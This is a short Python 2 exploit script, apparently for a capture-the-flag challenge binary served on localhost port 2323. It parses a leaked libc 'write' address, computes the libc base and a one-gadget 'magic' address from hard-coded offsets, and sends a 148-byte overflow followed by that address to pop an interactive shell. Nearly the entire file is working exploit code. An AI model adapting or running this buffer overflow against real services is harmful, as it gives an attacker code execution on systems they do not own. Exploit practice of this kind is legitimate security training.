#!/usr/bin/env python2
# use socat to run vuln program and make it listen on 2323 port
import time, sys, socket, telnetlib
from struct import *

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def p32(x): return pack('<I', x)


off_write=869312
off_magic=239628

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 2323))
recvuntil("\n") # here
recvuntil("\n") #empty line
recvuntil("\n") # puts
recvuntil("\n") # flush
recvuntil("\n") # read
addr_write=recvuntil("\n").split()[1] # write
print(addr_write)
recvuntil("\n") #string
recvuntil("\n") #line
recvuntil("\n") #enter
addr_write=int(addr_write,0)
print(addr_write)
base=addr_write-off_write
magic=off_magic+base

s.send("a"*148+p32(magic)*8+"\n")
interactive()


